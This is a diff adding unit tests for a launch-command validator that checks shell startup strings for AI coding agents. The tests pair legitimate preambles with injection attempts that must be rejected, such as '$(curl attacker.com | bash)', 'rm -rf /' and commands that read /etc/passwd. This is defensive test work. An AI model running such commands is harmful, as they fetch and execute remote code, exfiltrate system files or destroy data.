@@ -4,7 +4,7 @@
  */
 
 import { describe, it, expect } from "bun:test";
-import { validateConnectionIP, validateUsername, validateServerIdentifier } from "../security.js";
+import { validateConnectionIP, validateUsername, validateServerIdentifier, validateLaunchCmd } from "../security.js";
 
 describe("validateConnectionIP", () => {
   describe("valid inputs", () => {
@@ -170,6 +170,117 @@ describe("validateServerIdentifier", () => {
       expect(() => validateServerIdentifier("server@host")).toThrow(/Invalid server identifier/);
       expect(() => validateServerIdentifier("server:port")).toThrow(/Invalid server identifier/);
       expect(() => validateServerIdentifier("server#123")).toThrow(/Invalid server identifier/);
+    });
+  });
+});
+
+describe("validateLaunchCmd", () => {
+  describe("valid inputs — real commands from agent-setup.ts (issue #2052 regression)", () => {
+    it("should accept claude launch command with PATH setup", () => {
+      expect(() =>
+        validateLaunchCmd(
+          "source ~/.spawnrc 2>/dev/null; export PATH=$HOME/.claude/local/bin:$HOME/.local/bin:$HOME/.bun/bin:$PATH; claude",
+        ),
+      ).not.toThrow();
+    });
+
+    it("should accept codex launch command", () => {
+      expect(() =>
+        validateLaunchCmd("source ~/.spawnrc 2>/dev/null; source ~/.zshrc 2>/dev/null; codex"),
+      ).not.toThrow();
+    });
+
+    it("should accept openclaw launch command with PATH setup", () => {
+      expect(() =>
+        validateLaunchCmd(
+          "source ~/.spawnrc 2>/dev/null; export PATH=$HOME/.npm-global/bin:$HOME/.bun/bin:$HOME/.local/bin:$PATH; openclaw tui",
+        ),
+      ).not.toThrow();
+    });
+
+    it("should accept opencode launch command", () => {
+      expect(() =>
+        validateLaunchCmd("source ~/.spawnrc 2>/dev/null; source ~/.zshrc 2>/dev/null; opencode"),
+      ).not.toThrow();
+    });
+
+    it("should accept kilocode launch command", () => {
+      expect(() =>
+        validateLaunchCmd("source ~/.spawnrc 2>/dev/null; source ~/.zshrc 2>/dev/null; kilocode"),
+      ).not.toThrow();
+    });
+
+    it("should accept zeroclaw launch command with cargo env", () => {
+      expect(() =>
+        validateLaunchCmd(
+          "source ~/.cargo/env 2>/dev/null; source ~/.spawnrc 2>/dev/null; zeroclaw agent",
+        ),
+      ).not.toThrow();
+    });
+
+    it("should accept hermes launch command", () => {
+      expect(() =>
+        validateLaunchCmd("source ~/.spawnrc 2>/dev/null; hermes"),
+      ).not.toThrow();
+    });
+
+    it("should accept a simple binary with no preamble", () => {
+      expect(() => validateLaunchCmd("claude")).not.toThrow();
+      expect(() => validateLaunchCmd("aider")).not.toThrow();
+    });
+
+    it("should accept empty/blank commands (caller falls back to manifest)", () => {
+      expect(() => validateLaunchCmd("")).not.toThrow();
+      expect(() => validateLaunchCmd("   ")).not.toThrow();
+    });
+  });
+
+  describe("invalid inputs — injection attempts", () => {
+    it("should reject command substitution $()", () => {
+      expect(() => validateLaunchCmd("$(whoami)")).toThrow(/Invalid launch command/);
+      expect(() => validateLaunchCmd("source ~/.spawnrc 2>/dev/null; $(curl attacker.com | bash)")).toThrow(
+        /Invalid launch command/,
+      );
+    });
+
+    it("should reject backtick command substitution", () => {
+      expect(() => validateLaunchCmd("`id`")).toThrow(/Invalid launch command/);
+    });
+
+    it("should reject pipe operators", () => {
+      expect(() => validateLaunchCmd("claude | cat /etc/passwd")).toThrow(/Invalid launch command/);
+    });
+
+    it("should reject && chaining", () => {
+      expect(() => validateLaunchCmd("claude && curl attacker.com")).toThrow(/Invalid launch command/);
+    });
+
+    it("should reject || chaining", () => {
+      expect(() => validateLaunchCmd("false || curl attacker.com")).toThrow(/Invalid launch command/);
+    });
+
+    it("should reject arbitrary commands in preamble", () => {
+      expect(() =>
+        validateLaunchCmd("curl attacker.com; claude"),
+      ).toThrow(/Invalid launch command/);
+      expect(() =>
+        validateLaunchCmd("rm -rf /; claude"),
+      ).toThrow(/Invalid launch command/);
+    });
+
+    it("should reject redirection to arbitrary paths in preamble", () => {
+      expect(() =>
+        validateLaunchCmd("cat /etc/passwd > /tmp/out; claude"),
+      ).toThrow(/Invalid launch command/);
+    });
+
+    it("should reject commands that are too long", () => {
+      const longCmd = "claude " + "a".repeat(1020);
+      expect(() => validateLaunchCmd(longCmd)).toThrow(/too long/);
+    });
+
+    it("should reject uppercase binary names (not in agent-setup.ts)", () => {
+      expect(() => validateLaunchCmd("Claude")).toThrow(/Invalid launch command/);
     });
   });
 });
